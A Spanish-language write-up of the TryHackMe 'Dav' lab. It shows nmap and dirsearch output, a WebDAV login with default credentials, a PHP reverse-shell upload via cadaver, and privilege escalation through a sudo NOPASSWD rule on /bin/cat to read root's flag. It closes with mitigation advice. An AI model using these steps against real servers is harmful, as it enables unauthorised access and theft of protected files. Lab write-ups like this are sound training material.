---
tags:
  - webdav
  - cadaver
  - sudo
  - cat
  - Nmap
  - web
  - dirsearch
---



# Resumen

Durante el pentest de la máquina **Dav** se identificó un servidor web Apache en el puerto 80. Mediante enumeración de directorios se detectó un endpoint WebDAV protegido por autenticación. Tras probar credenciales por defecto se obtuvo acceso al espacio WebDAV y con la herramienta `cadaver` se subió una webshell. Con la shell remota se ejecutaron enumeración y comprobaciones; `sudo -l` reveló que el usuario `www-data` podía ejecutar `/bin/cat` como **cualquier usuario** sin contraseña (`NOPASSWD`). Aprovechando esto se leyó directamente `/root/root.txt` y se consiguió la flag de root.

Este writeup explica con detalle decisión por decisión: por qué se usaron las herramientas, qué outputs importaron, y cómo mitigar las vulnerabilidades encontradas.


## Alcance y ambiente

- Máquina: `Dav` (TryHackMe)
- IP objetivo (en el momento de las pruebas): `10.201.28.85` (Nmap muestra la IP escaneada)
- Herramientas principales: `nmap`, `dirsearch`, `cadaver`, una reverse shell PHP, y comandos del sistema remoto (`sudo -l`, `/bin/cat`).
- Nota de alcance: Todo el trabajo se realizó en el entorno de laboratorio de TryHackMe con fines educativos.

## Reconocimiento: `nmap`

Comando usado:

```bash
# Nmap 7.95 scan initiated Mon Sep 15 16:08:27 2025 as: /usr/lib/nmap/nmap --privileged -sV -sS -Pn -p- -sC --min-rate 5000 -oN nmap.txt 10.201.28.85
Nmap scan report for 10.201.28.85
Host is up (0.24s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 15 16:08:55 2025 -- 1 IP address (1 host up) scanned in 28.35 seconds
                                                                                                  
```

**Resultado relevante:** 

```bash
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

**Interpretación**: Solo el servicio HTTP en el puerto 80 está abierto y responde con una página por defecto de Apache. La versión _2.4.18_ indica una instalación relativamente antigua de Apache (en el contexto de Ubuntu), que puede dar pistas sobre configuraciones por defecto o módulos habilitados.

El resultado de `nmap` nos dio el primer indicio: había un servicio web — objetivo natural para enumeración HTTP más profunda.

## Enumeración web: `dirsearch` y descubrimiento de WebDAV

Se realizó un barrido de directorios con `dirsearch` hacia la URL base. El output esencial fue: 

```bash
─(zikuta㉿zikuta)-[~/Desktop/dav]
└─$ dirsearch -u http://10.201.23.176                                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                  
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                           
                                                                                                                                                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/zikuta/Desktop/dav/reports/http_10.201.23.176/_25-09-15_19-04-02.txt

Target: http://10.201.23.176/

[19:04:02] Starting:                                                               
[19:06:05] 401 -  460B  - /webdav/                                          
[19:06:05] 401 -  460B  - /webdav/servlet/webdav/
[19:06:05] 401 -  460B  - /webdav/index.html
```

### ¿Qué indica esto?

- El servidor responde `401 Unauthorized` para `/webdav/`, lo que apunta a un recurso protegido por autenticación — muy probablemente un servicio WebDAV montado en el servidor.
- `/webdav/servlet/webdav/` sugiere la presencia de un servlet WebDAV (posible implementación sobre Tomcat/servlets o simplemente rutas con esa estructura), aunque la cabecera del servidor era Apache.

### Decisión de ataque

Dado que WebDAV permite (si se configura así) operaciones de escritura/remoto (PUT/DELETE), un recurso WebDAV autenticado es un objetivo excelente: si se descubren credenciales válidas, es posible subir archivos (por ejemplo, una webshell) y ejecutarlos a través del servidor web.


## Credenciales por defecto y acceso inicial

Con la pista de WebDAV protegido, probé credenciales comunes/por defecto: `xampp` / `wampp` (credenciales frecuentemente usadas en laboratorios y distribuciones de desarrollo). Estas credenciales funcionaron para autenticar contra `/webdav/`.

**Nota sobre razonamiento:** En entornos de laboratorio y despliegues con configuración por defecto, es habitual encontrar credenciales débiles o valores por defecto no cambiados — siempre es una verificación válida en una auditoría. 


## Uso de `cadaver` para interactuar con WebDAV

`cadaver` es un cliente interactivo para WebDAV en consola que permite listar, descargar y subir archivos a un endpoint WebDAV.


```bash
(zikuta㉿zikuta)-[~/Desktop/dav]
└─$ cadaver http://10.201.23.176/webdav
Authentication required for webdav on server `10.201.23.176':
Username: wampp
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 25  2019
dav:/webdav/> put shelsita.php
Uploading shelsita.php to `/webdav/shelsita.php':
Progress: [=============================>] 100.0% of 2587 bytes succeeded.
dav:/webdav/> 
```

### ¿Qué se hizo?

1. Se autenticó con `cadaver` contra `/webdav` y se listó el contenido. Aparecía al menos `passwd.dav`, lo que confirma el control de ficheros en ese  directorio.
2. Se subio un archivo: `shelsita.php` (una reverse shell  `PHP Pentest Monkey`, ~2.5KB).

**Riesgo explotado:** la existencia de WebDAV con permisos de escritura combinada con credenciales débiles permitió subir código ejecutable al espacio público del servidor web.

## Obtención de shell y post-explotación inicial

Tras subir la reverse shell se accedió vía HTTP al archivo mientras escuchamos en `nc`.

Con la sesión remota como `www-data` (usuario típico del servidor web), se hizo enumeración local y se ejecutaron comprobaciones de sudo:


```bash
www-data@ubuntu:/home/merlin$ sudo -l                                                                                                                                                                             
sudo -l                                                                                                                                                                                                           
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
### Interpretación del `sudo -l`

- `www-data` puede ejecutar `/bin/cat` como **cualquier usuario** (ALL) sin necesidad de contraseña. Esto es un hallazgo crítico: potencia de lectura sobre cualquier fichero del sistema sin restricciones. 

## Escalada a root (abuso de sudo NOPASSWD para /bin/cat)

Con la capacidad de ejecutar `/bin/cat` como root (o como cualquier usuario) sin contraseña, se puede **leer** directamente ficheros sensibles, incluido `/root/root.txt`.

Comando ejecutado:

```bash
www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
```

Y con eso se obtuvo la flag de root.

### ¿Por qué esto funciona?

Sudo con `NOPASSWD` no requiere contraseña para ejecutar el binario autorizado. Si se autoriza `/bin/cat` sobre _ALL_ usuarios, entonces con `sudo /bin/cat /root/archivo` se leen ficheros que normalmente sólo root puede leer. Aunque no da una shell root interactiva, permite extraer información crítica y, potencialmente, otros secretos que permitan una escalada adicional.


## Evidencia y trazas relevantes

- `nmap` mostrando Apache/2.4.18
- `dirsearch` mostrando `401` en `/webdav/`
- `cadaver` mostrando `Listing collection` y subida de `shelsita.php`
- `sudo -l` output mostrando `User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat`
- `sudo /bin/cat /root/root.txt` lectura de `root.txt`


## Recomendaciones de mitigación

1. **Eliminar credenciales por defecto y usar contraseñas robustas**: nunca dejar cuentas `wampp/xampp` o similares con contraseñas conocidas. Reemplazar con autenticación fuerte o integrar con un gestor de secretos.
2. **Restringir acceso WebDAV**: si no se requiere, deshabilitar WebDAV. Si es necesario, restringir las operaciones de escritura por IP o por usuario, y validar uploads para bloquear ficheros ejecutables.
3. **Configuración de** `**sudo**` **mínima**: evitar reglas `NOPASSWD` para comandos que permiten leer o ejecutar código. Si es estrictamente necesario permitir ciertos comandos, restringir su uso a rutas y parámetros concretos (ej. no `ALL` ni comandos como `cat` sin control).
4. **Seguridad en el árbol web**: configurar el servidor para que no ejecute scripts subidos en directorios de upload, o separar directorios de upload de los que se ejecutan como código.
5. **Auditoría de logs**: revisar logs de acceso de Apache y del sistema para detectar subidas no autorizadas o actividad sospechosa.
6. **Principio de menor privilegio**: `www-data` no debería tener permisos especiales en `sudo`.


## Conclusiones y lecciones aprendidas

- Un servicio relativamente sencillo (WebDAV) combinado con credenciales por defecto resulta en un acceso inicial trivial — el vector clásico de muchos incidentes reales.
- Las reglas de `sudo` mal configuradas (especialmente `NOPASSWD` sobre binarios que permiten leer o ejecutar contenido arbitrario) son una escalada de privilegios de bajo esfuerzo y alto impacto.
- En auditorías, no subestimar recursos “de desarrollo” como `xampp`/`wampp` que pueden permanecer activos en entornos productivos o de prueba.